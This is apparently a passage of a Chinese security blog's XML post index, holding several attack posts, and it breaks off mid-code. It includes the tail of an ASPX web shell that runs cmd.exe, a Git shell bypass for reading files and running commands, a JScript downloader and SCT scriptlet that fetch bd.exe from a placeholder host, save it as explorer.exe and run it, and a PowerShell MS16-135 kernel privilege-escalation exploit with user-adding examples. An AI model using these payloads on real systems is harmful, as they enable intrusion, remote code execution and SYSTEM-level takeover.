Sub&lt;/script&gt;&lt;html&gt;&lt;body&gt; &lt;form runat="server"&gt; &lt;p&gt;&lt;asp:Label id="L_p" runat="server" width="80px"&gt;Program&lt;/asp:Label&gt; &lt;asp:TextBox id="xpath" runat="server" Width="300px"&gt;c:\windows\system32\cmd.exe&lt;/asp:TextBox&gt; &lt;p&gt;&lt;asp:Label id="L_a" runat="server" width="80px"&gt;Arguments&lt;/asp:Label&gt; &lt;asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user"&gt;/c net user&lt;/asp:TextBox&gt; &lt;p&gt;&lt;asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"&gt;&lt;/asp:Button&gt; &lt;p&gt;&lt;asp:Label id="result" runat="server"&gt;&lt;/asp:Label&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; Pentest]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Git Shell Bypass]]></title>
    <url>%2Farchives%2FCVE_2017_8386.html</url>
    <content type="text"><![CDATA[é€šè¿‡gitè¯»æ–‡ä»¶ï¼š12git-receive-pack '--help' #æœ¬åœ°ssh git@remoteserver "git-receive-pack '--help'" #è¿œç¨‹æœåŠ¡å™¨ æ‰“å¼€ä»¥åæŒ‰shift+eï¼Œç„¶åè¾“å…¥è¦è¯»çš„æ–‡ä»¶è·¯å¾„ é€šè¿‡gitæ‰§è¡Œå‘½ä»¤ï¼š12git-receive-pack '--help' #æœ¬åœ°ssh git@remoteserver "git-receive-pack '--help'" #è¿œç¨‹æœåŠ¡å™¨ è¾“å…¥ï¼åè¾“å…¥è¦æ‰§è¡Œçš„å‘½ä»¤ï¼š è¯¦æƒ…ï¼šæˆ³æˆ‘]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[JSä¸‹è½½è€…]]></title>
    <url>%2Farchives%2Fjsdownloader.html</url>
    <content type="text"><![CDATA[1234567891011121314151617181920var WSHShell = new ActiveXObject("WScript.Shell");path = WSHShell.ExpandEnvironmentStrings("%temp%");var filepath = path+"/explorer.exe";var xhr = new ActiveXObject("MSXML2.XMLHTTP");xhr.open("GET","http://x.x.x.x/bd.exe", false);xhr.send();if (xhr.Status == 200) &#123; var fso = new ActiveXObject("Scripting.FileSystemObject"); var stream = new ActiveXObject("ADODB.Stream"); stream.Open(); stream.Type = 1; stream.Write(xhr.ResponseBody); stream.Position = 0; if (fso.FileExists(filepath))&#123; fso.DeleteFile(filepath); &#125; stream.SaveToFile(filepath); stream.Close(); new ActiveXObject("WScript.Shell").Exec(filepath);&#125; SCT:12345678910111213141516171819202122232425262728293031323334&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registration progid="ShortJSRAT" classid="&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;" &gt; &lt;!-- Learn from Casey Smith @subTee --&gt; &lt;script language="JScript"&gt; &lt;![CDATA[ var WSHShell = new ActiveXObject("WScript.Shell"); path = WSHShell.ExpandEnvironmentStrings("%temp%"); var filepath = path+"/explorer.exe"; var xhr = new ActiveXObject("MSXML2.XMLHTTP"); xhr.open("GET","http://x.x.x.x/bd.exe", false); xhr.send(); if (xhr.Status == 200) &#123; var fso = new ActiveXObject("Scripting.FileSystemObject"); var stream = new ActiveXObject("ADODB.Stream"); stream.Open(); stream.Type = 1; stream.Write(xhr.ResponseBody); stream.Position = 0; if (fso.FileExists(filepath))&#123; fso.DeleteFile(filepath); &#125; stream.SaveToFile(filepath); stream.Close(); new ActiveXObject("WScript.Shell").Exec(filepath); &#125; ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt;]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MS16-135 å¸¦å‚æ•°ç‰ˆ]]></title>
    <url>%2Farchives%2FInvoke-MS16-135.html</url>
    <content type="text"><![CDATA[ä¿®æ”¹äº†ä¸€ä¸ªå¸¦å‚æ•°ç‰ˆçš„ï¼Œæ–¹ä¾¿ç”¨ï¼Œä»£ç å¦‚ä¸‹ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880function Invoke-MS16-135 &#123;&lt;#.SYNOPSIS PowerShell implementation of MS16-135. The exploit targets all vulnerable operating systems that support PowerShell v2+. * Win7-Win10 &lt;== 64 bit!.PARAMETER ApplicationSpecifies an Application to run..PARAMETER CommandlineSpecifies Commandline, such as net user xxx xxx /add .EXAMPLE C:\PS&gt; Invoke-MS16-135 -Application C:\Windows\System32\cmd.exe C:\PS&gt; Invoke-MS16-135 -Application C:\Windows\System32\cmd.exe -Commandline "/c net user 1 1 /add"#&gt;[CmdletBinding()]param( [Parameter(Mandatory = $False, ParameterSetName = 'C:\Windows\System32\cmd.exe' )] [string] $Application, [Parameter(Mandatory = $False)] [string] $Commandline)Add-Type -TypeDefinition @"using System;using System.Diagnostics;using System.Runtime.InteropServices;using System.Security.Principal;[StructLayout(LayoutKind.Sequential)]public struct INPUT&#123; public int itype; public KEYBDINPUT U; public int Size;&#125;[StructLayout(LayoutKind.Sequential)]public struct KEYBDINPUT&#123; public UInt16 wVk; public UInt16 wScan; public uint dwFlags; public int time; public IntPtr dwExtraInfo;&#125;[StructLayout(LayoutKind.Sequential)] public struct tagMSG &#123; public IntPtr hwnd; public UInt32 message; public UIntPtr wParam; public UIntPtr lParam; public UInt32 time; public POINT pt;&#125;public struct POINT&#123; public Int32 x; public Int32 Y;&#125;public class ms16135&#123; delegate IntPtr WndProc( IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam); [System.Runtime.InteropServices.StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)] struct WNDCLASSEX &#123; public uint cbSize; public uint style; public IntPtr lpfnWndProc; public int cbClsExtra; public int cbWndExtra; public IntPtr hInstance; public IntPtr hIcon; public IntPtr hCursor; public IntPtr hbrBackground; [MarshalAs(UnmanagedType.LPWStr)] public string lpszMenuName; [MarshalAs(UnmanagedType.LPWStr)] public string lpszClassName; public IntPtr hIconSm; &#125; [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)] static extern System.UInt16 RegisterClassW( [System.Runtime.InteropServices.In] ref WNDCLASSEX lpWndClass); [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)] public static extern IntPtr CreateWindowExW( UInt32 dwExStyle, [MarshalAs(UnmanagedType.LPWStr)] string lpClassName, [MarshalAs(UnmanagedType.LPWStr)] string lpWindowName, UInt32 dwStyle, Int32 x, Int32 y, Int32 nWidth, Int32 nHeight, IntPtr hWndParent, IntPtr hMenu, IntPtr hInstance, IntPtr lpParam); [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)] static extern System.IntPtr DefWindowProcW( IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam); [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)] public static extern bool DestroyWindow( IntPtr hWnd); [DllImport("user32.dll", SetLastError = true)] public static extern bool UnregisterClass( String lpClassName, IntPtr hInstance); [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetModuleHandleW( [MarshalAs(UnmanagedType.LPWStr)] String lpModuleName); [DllImport("user32.dll", EntryPoint="SetWindowLongPtr")] public static extern IntPtr SetWindowLongPtr( IntPtr hWnd, int nIndex, IntPtr dwNewLong); [DllImport("user32.dll")] public static extern bool ShowWindow( IntPtr hWnd, int nCmdShow); [DllImport("user32.dll", SetLastError = true)] public static extern IntPtr SetParent( IntPtr hWndChild, IntPtr hWndNewParent); [DllImport("user32.dll", SetLastError = false)] public static extern IntPtr GetDesktopWindow(); [DllImport("user32.dll")] public static extern bool SetForegroundWindow( IntPtr hWnd); [DllImport("user32.dll", SetLastError=true)] public static extern void SwitchToThisWindow( IntPtr hWnd, bool fAltTab); [DllImport("user32.dll")] public static extern bool GetMessage( out tagMSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax); [DllImport("user32.dll")] public static extern bool TranslateMessage( [In] ref tagMSG lpMsg); [DllImport("user32.dll")] public static extern IntPtr DispatchMessage( [In] ref tagMSG lpmsg); [DllImport("user32.dll", SetLastError = true)] public static extern IntPtr SetFocus( IntPtr hWnd); [DllImport("user32.dll")] public static extern uint SendInput( uint nInputs, [In] INPUT pInputs, int cbSize); [DllImport("gdi32.dll")] public static extern int GetBitmapBits( IntPtr hbmp, int cbBuffer, IntPtr lpvBits); [DllImport("gdi32.dll")] public static extern int SetBitmapBits( IntPtr hbmp, int cbBytes, IntPtr lpBits); [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr VirtualAlloc( IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect); public UInt16 CustomClass(string class_name) &#123; m_wnd_proc_delegate = CustomWndProc; WNDCLASSEX wind_class = new WNDCLASSEX(); wind_class.lpszClassName = class_name; ///wind_class.cbSize = (uint)Marshal.SizeOf(wind_class); wind_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m_wnd_proc_delegate); return RegisterClassW(ref wind_class); &#125; private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam) &#123; return DefWindowProcW(hWnd, msg, wParam, lParam); &#125; private WndProc m_wnd_proc_delegate;&#125;"@#==============================================================[Banner] $ms16135 = @" _____ _____ ___ ___ ___ ___ ___ | | __|_ | | _|___|_ | |_ | _| | | | |__ |_| |_| . |___|_| |_|_ |_ | |_|_|_|_____|_____|___| |_____|___|___| [by b33f -&gt; @FuzzySec] "@$ms16135#==============================================================[Pre-Run]# Exploit is only for x64if ([System.IntPtr]::Size -ne 8) &#123; echo "`n[!] Target architecture is x64 only!`n" Return&#125;# Get OS version$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version$Script:OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"switch ($OSMajorMinor)&#123; '10.0' # Win10 / 2k16 &#123; echo "[?] Target is Win 10" echo "[+] Bitmap dimensions: 0x760*0x4`n" &#125; '6.3' # Win8.1 / 2k12R2 &#123; echo "[?] Target is Win 8.1" echo "[+] Bitmap dimensions: 0x760*0x4`n" &#125; '6.2' # Win8 / 2k12 &#123; echo "[?] Target is Win 8" echo "[+] Bitmap dimensions: 0x760*0x4`n" &#125; '6.1' # Win7 / 2k8R2 &#123; echo "[?] Target is Win 7" echo "[+] Bitmap dimensions: 0x770*0x4`n" &#125;&#125;#==============================================================[Helpers]function Get-LoadedModules &#123;&lt;#.SYNOPSIS Use NtQuerySystemInformation::SystemModuleInformation to get a list of loaded modules, their base address and size (x32/x64). Note: Low integrity only pre 8.1.DESCRIPTION Author: Ruben Boonen (@FuzzySec) License: BSD 3-Clause Required Dependencies: None Optional Dependencies: None.EXAMPLE C:\PS&gt; $Modules = Get-LoadedModules C:\PS&gt; $KernelBase = $Modules[0].ImageBase C:\PS&gt; $KernelType = ($Modules[0].ImageName -split "\\")[-1] C:\PS&gt; ......#&gt; Add-Type -TypeDefinition @" using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; [StructLayout(LayoutKind.Sequential, Pack = 1)] public struct SYSTEM_MODULE_INFORMATION &#123; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)] public UIntPtr[] Reserved; public IntPtr ImageBase; public UInt32 ImageSize; public UInt32 Flags; public UInt16 LoadOrderIndex; public UInt16 InitOrderIndex; public UInt16 LoadCount; public UInt16 ModuleNameOffset; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)] internal Char[] _ImageName; public String ImageName &#123; get &#123; return new String(_ImageName).Split(new Char[] &#123;'\0'&#125;, 2)[0]; &#125; &#125; &#125; public static class Ntdll &#123; [DllImport("ntdll.dll")] public static extern int NtQuerySystemInformation( int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int ReturnLength); &#125;"@ [int]$BuffPtr_Size = 0 while ($true) &#123; [IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size) $SystemInformationLength = New-Object Int # SystemModuleInformation Class = 11 $CallResult = [Ntdll]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength) # STATUS_INFO_LENGTH_MISMATCH if ($CallResult -eq 0xC0000004) &#123; [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr) [int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength) &#125; # STATUS_SUCCESS elseif ($CallResult -eq 0x00000000) &#123; break &#125; # Probably: 0xC0000005 -&gt; STATUS_ACCESS_VIOLATION else &#123; [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr) return &#125; &#125; $SYSTEM_MODULE_INFORMATION = New-Object SYSTEM_MODULE_INFORMATION $SYSTEM_MODULE_INFORMATION = $SYSTEM_MODULE_INFORMATION.GetType() if ([System.IntPtr]::Size -eq 4) &#123; $SYSTEM_MODULE_INFORMATION_Size = 284 &#125; else &#123; $SYSTEM_MODULE_INFORMATION_Size = 296 &#125; $BuffOffset = $BuffPtr.ToInt64() $HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset) $BuffOffset = $BuffOffset + [System.IntPtr]::Size $SystemModuleArray = @() for ($i=0; $i -lt $HandleCount; $i++)&#123; $SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset $Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION) $HashTable = @&#123; ImageName = $Cast.ImageName ImageBase = if ([System.IntPtr]::Size -eq 4) &#123;$($Cast.ImageBase).ToInt32()&#125; else &#123;$($Cast.ImageBase).ToInt64()&#125; ImageSize = "0x$('&#123;0:X&#125;' -f $Cast.ImageSize)" &#125; $Object = New-Object PSObject -Property $HashTable $SystemModuleArray += $Object $BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size &#125; $SystemModuleArray # Free SystemModuleInformation array [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)&#125;function Stage-gSharedInfoBitmap &#123;&lt;#.SYNOPSIS Universal Bitmap leak using accelerator tables, 32/64 bit Win7-10 (post anniversary)..DESCRIPTION Author: Ruben Boonen (@FuzzySec) License: BSD 3-Clause Required Dependencies: None Optional Dependencies: None.EXAMPLE PS C:\Users\b33f&gt; Stage-gSharedInfoBitmap |fl BitmapKernelObj : -7692235059200 BitmappvScan0 : -7692235059120 BitmapHandle : 1845828432 PS C:\Users\b33f&gt; $Manager = Stage-gSharedInfoBitmap PS C:\Users\b33f&gt; "&#123;0:X&#125;" -f $Manager.BitmapKernelObj FFFFF901030FF000#&gt; Add-Type -TypeDefinition @" using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; public static class gSharedInfoBitmap &#123; [DllImport("gdi32.dll")] public static extern IntPtr CreateBitmap( int nWidth, int nHeight, uint cPlanes, uint cBitsPerPel, IntPtr lpvBits); [DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)] public static extern IntPtr LoadLibrary( string lpFileName); [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)] public static extern IntPtr GetProcAddress( IntPtr hModule, string procName); [DllImport("user32.dll")] public static extern IntPtr CreateAcceleratorTable( IntPtr lpaccl, int cEntries); [DllImport("user32.dll")] public static extern bool DestroyAcceleratorTable( IntPtr hAccel); &#125;"@ # Check Arch if ([System.IntPtr]::Size -eq 4) &#123; $x32 = 1 &#125; function Create-AcceleratorTable &#123; [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(10000) $AccelHandle = [gSharedInfoBitmap]::CreateAcceleratorTable($Buffer, 700) # +4 kb size $User32Hanle = [gSharedInfoBitmap]::LoadLibrary("user32.dll") $gSharedInfo = [gSharedInfoBitmap]::GetProcAddress($User32Hanle, "gSharedInfo") if ($x32)&#123; $gSharedInfo = $gSharedInfo.ToInt32() &#125; else &#123; $gSharedInfo = $gSharedInfo.ToInt64() &#125; $aheList = $gSharedInfo + [System.IntPtr]::Size if ($x32)&#123; $aheList = [System.Runtime.InteropServices.Marshal]::ReadInt32($aheList) $HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0xc # _HANDLEENTRY.Size = 0xC $phead = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleEntry) &#125; else &#123; $aheList = [System.Runtime.InteropServices.Marshal]::ReadInt64($aheList) $HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0x18 # _HANDLEENTRY.Size = 0x18 $phead = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleEntry) &#125; $Result = @() $HashTable = @&#123; Handle = $AccelHandle KernelObj = $phead &#125; $Object = New-Object PSObject -Property $HashTable $Result += $Object $Result &#125; function Destroy-AcceleratorTable &#123; param ($Hanlde) $CallResult = [gSharedInfoBitmap]::DestroyAcceleratorTable($Hanlde) &#125; $KernelArray = @() for ($i=0;$i -lt 20;$i++) &#123; $KernelArray += Create-AcceleratorTable if ($KernelArray.Length -gt 1) &#123; if ($KernelArray[$i].KernelObj -eq $KernelArray[$i-1].KernelObj) &#123; Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4) if ($OSMajorMinor -eq "6.1") &#123; $BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x770, 4, 1, 8, $Buffer) # Win7 &#125; else &#123; $BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x760, 4, 1, 8, $Buffer) # Win8-10 &#125; break &#125; &#125; Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle &#125; $BitMapObject = @() $HashTable = @&#123; BitmapHandle = $BitmapHandle BitmapKernelObj = $($KernelArray[$i].KernelObj) BitmappvScan0 = if ($x32) &#123;$($KernelArray[$i].KernelObj) + 0x32&#125; else &#123;$($KernelArray[$i].KernelObj) + 0x50&#125; &#125; $Object = New-Object PSObject -Property $HashTable $BitMapObject += $Object $BitMapObject&#125;function Bitmap-Elevate &#123; param([IntPtr]$ManagerBitmap,[IntPtr]$WorkerBitmap) Add-Type -TypeDefinition @" using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; public static class BitmapElevate &#123; [DllImport("gdi32.dll")] public static extern int SetBitmapBits( IntPtr hbmp, uint cBytes, byte[] lpBits); [DllImport("gdi32.dll")] public static extern int GetBitmapBits( IntPtr hbmp, int cbBuffer, IntPtr lpvBits); [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr VirtualAlloc( IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect); [DllImport("kernel32.dll", SetLastError=true)] public static extern bool VirtualFree( IntPtr lpAddress, uint dwSize, uint dwFreeType); [DllImport("kernel32.dll", SetLastError=true)] public static extern bool FreeLibrary( IntPtr hModule); [DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)] public static extern IntPtr LoadLibrary( string lpFileName); [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)] public static extern IntPtr GetProcAddress( IntPtr hModule, string procName); &#125;"@ # Arbitrary Kernel read function Bitmap-Read &#123; param ($Address) $CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address)) [IntPtr]$Pointer = [BitmapElevate]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40) $CallResult = [BitmapElevate]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer) if ($x32Architecture)&#123; [System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer) &#125; else &#123; [System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer) &#125; $CallResult = [BitmapElevate]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000) &#125; # Arbitrary Kernel write function Bitmap-Write &#123; param ($Address, $Value) $CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address)) $CallResult = [BitmapElevate]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value)) &#125; switch ($OSMajorMinor) &#123; '10.0' # Win10 / 2k16 &#123; $UniqueProcessIdOffset = 0x2e8 $TokenOffset = 0x358 $ActiveProcessLinks = 0x2f0 &#125; '6.3' # Win8.1 / 2k12R2 &#123; $UniqueProcessIdOffset = 0x2e0 $TokenOffset = 0x348 $ActiveProcessLinks = 0x2e8 &#125; '6.2' # Win8 / 2k12 &#123; $UniqueProcessIdOffset = 0x2e0 $TokenOffset = 0x348 $ActiveProcessLinks = 0x2e8 &#125; '6.1' # Win7 / 2k8R2 &#123; $UniqueProcessIdOffset = 0x180 $TokenOffset = 0x208 $ActiveProcessLinks = 0x188 &#125; &#125; # Get EPROCESS entry for System process echo "`n[&gt;] Leaking SYSTEM _EPROCESS.." $SystemModuleArray = Get-LoadedModules $KernelBase = $SystemModuleArray[0].ImageBase $KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1] $KernelHanle = [BitmapElevate]::LoadLibrary("$KernelType") $PsInitialSystemProcess = [BitmapElevate]::GetProcAddress($KernelHanle, "PsInitialSystemProcess") $SysEprocessPtr = if (!$x32Architecture) &#123;$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase&#125; else &#123;$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase&#125; $CallResult = [BitmapElevate]::FreeLibrary($KernelHanle) echo "[+] _EPROCESS list entry: 0x$("&#123;0:X&#125;" -f $SysEprocessPtr)" $SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr echo "[+] SYSTEM _EPROCESS address: 0x$("&#123;0:X&#125;" -f $(Bitmap-Read -Address $SysEprocessPtr))" echo "[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))" echo "[+] SYSTEM Token: 0x$("&#123;0:X&#125;" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))" $SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset) # Get EPROCESS entry for current process echo "`n[&gt;] Leaking current _EPROCESS.." echo "[+] Traversing ActiveProcessLinks list" $NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size while($true) &#123; $NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset) if ($NextPID -eq $PID) &#123; echo "[+] PowerShell _EPROCESS address: 0x$("&#123;0:X&#125;" -f $NextProcess)" echo "[+] PID: $NextPID" echo "[+] PowerShell Token: 0x$("&#123;0:X&#125;" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))" $PoShTokenAddr = $NextProcess+$TokenOffset break &#125; $NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size &#125; # Duplicate token! echo "`n[!] Duplicating SYSTEM token!`n" Bitmap-Write -Address $PoShTokenAddr -Value $SysToken&#125;#==============================================================[Keyboard Functions]# See: https://msdn.microsoft.com/en-us/library/ms927178.aspxfunction Sim-KeyDown &#123; param([Int]$wKey) $KeyboardInput = New-Object KEYBDINPUT $KeyboardInput.dwFlags = 0 $KeyboardInput.wVk = $wKey $InputObject = New-Object INPUT $InputObject.itype = 1 $InputObject.U = $KeyboardInput $InputSize = [System.Runtime.InteropServices.Marshal]::SizeOf($InputObject) $CallResult = [ms16135]::SendInput(1, $InputObject, $InputSize) if ($CallResult -eq 1) &#123; $true &#125; else &#123; $false &#125;&#125;function Sim-KeyUp &#123; param([Int]$wKey) $KeyboardInput = New-Object KEYBDINPUT $KeyboardInput.dwFlags = 2 $KeyboardInput.wVk = $wKey $InputObject = New-Object INPUT $InputObject.itype = 1 $InputObject.U = $KeyboardInput $InputSize = [System.Runtime.InteropServices.Marshal]::SizeOf($InputObject) $CallResult = [ms16135]::SendInput(1, $InputObject, $InputSize) if ($CallResult -eq 1) &#123; $true &#125; else &#123; $false &#125;&#125;function Do-AltShiftEsc &#123; $CallResult = Sim-KeyDown -wKey 0x12 # VK_MENU $CallResult = Sim-KeyDown -wKey 0x10 # VK_SHIFT $CallResult = Sim-KeyDown -wKey 0x1b # VK_ESCAPE $CallResult = Sim-KeyUp -wKey 0x1b # VK_ESCAPE $CallResult = Sim-KeyDown -wKey 0x1b # VK_ESCAPE $CallResult = Sim-KeyUp -wKey 0x1b # VK_ESCAPE $CallResult = Sim-KeyUp -wKey 0x12 # VK_MENU $CallResult = Sim-KeyUp -wKey 0x10 # VK_SHIFT&#125;function Do-AltShiftTab &#123; param([Int]$Count) $CallResult = Sim-KeyDown -wKey 0x12 # VK_MENU $CallResult = Sim-KeyDown -wKey 0x10 # VK_SHIFT for ($i=0;$i -lt $count;$i++) &#123; $CallResult = Sim-KeyDown -wKey 0x9 # VK_TAB $CallResult = Sim-KeyUp -wKey 0x9 # VK_TAB &#125; $CallResult = Sim-KeyUp -wKey 0x12 # VK_MENU $CallResult = Sim-KeyUp -wKey 0x10 # VK_SHIFT&#125;#==============================================================[Create-Bitmaps]do &#123; $Bitmap1 = Stage-gSharedInfoBitmap $Bitmap2 = Stage-gSharedInfoBitmap if ($Bitmap1.BitmapKernelObj -lt $Bitmap2.BitmapKernelObj) &#123; $WorkerBitmap = $Bitmap1 $ManagerBitmap = $Bitmap2 &#125; else &#123; $WorkerBitmap = $Bitmap2 $ManagerBitmap = $Bitmap1 &#125; $Distance = $ManagerBitmap.BitmapKernelObj - $WorkerBitmap.BitmapKernelObj&#125; while ($Distance -ne 0x2000)echo "[?] Adjacent large session pool feng shui.."echo "[+] Worker : $('&#123;0:X&#125;' -f $WorkerBitmap.BitmapKernelObj)"echo "[+] Manager : $('&#123;0:X&#125;' -f $ManagerBitmap.BitmapKernelObj)"echo "[+] Distance: 0x$('&#123;0:X&#125;' -f $Distance)"# Address of the y-coordinate for the bitmap$TargetAddress = $WorkerBitmap.BitmapKernelObj + 63#==============================================================[Trigger Function]function Do-OrAddress &#123; param([Int64]$Address) # Create WNDCLASSEX atom $AtomCreate = New-Object ms16135 $hAtom = $AtomCreate.CustomClass("cve-2016-7255") if ($hAtom -eq 0)&#123; break &#125; echo "`n[?] Creating Window objects" $hMod = [ms16135]::GetModuleHandleW([String]::Empty) # WS_OVERLAPPEDWINDOW|WS_VISIBLE $hWndParent = [ms16135]::CreateWindowExW(0,"cve-2016-7255",[String]::Empty,0x10CF0000,0,0,360,360,[IntPtr]::Zero,[IntPtr]::Zero,$hMod,[IntPtr]::Zero) if ($hWndParent -eq 0)&#123; break &#125; # WS_OVERLAPPEDWINDOW|WS_VISIBLE|WS_CHILD $hWndChild = [ms16135]::CreateWindowExW(0,"cve-2016-7255","cve-2016-7255",0x50CF0000,0,0,160,160,$hWndParent,[IntPtr]::Zero,$hMod,[IntPtr]::Zero) if ($hWndChild -eq 0)&#123; break &#125; # Align target $Address = $Address - 0x28 echo "[+] Corrupting child window spmenu" # manipulate child spmenu $CallResult = [ms16135]::SetWindowLongPtr($hWndChild,-12,[IntPtr]$Address) # Window magic $CallResult = [ms16135]::ShowWindow($hWndParent,1) $hDesktopWindow = [ms16135]::GetDesktopWindow() $CallResult = [ms16135]::SetParent($hWndChild,$hDesktopWindow) $CallResult = [ms16135]::SetForegroundWindow($hWndChild) Do-AltShiftTab -Count 4 $CallResult = [ms16135]::SwitchToThisWindow($hWndChild,$true) Do-AltShiftEsc # This is a bit messy, but the bug is not easy to trigger # while also reliably exiting the loop. Basically we try to # trigger the arbitrary "Or" for 3 seconds and then check if # it was successful. If not we try up to ten times (should # take 2-4 attempts). function Trigger-Write &#123; $SafeGuard = [diagnostics.stopwatch]::StartNew() while ($SafeGuard.ElapsedMilliseconds -lt 3000) &#123; $tagMSG = New-Object tagMSG if 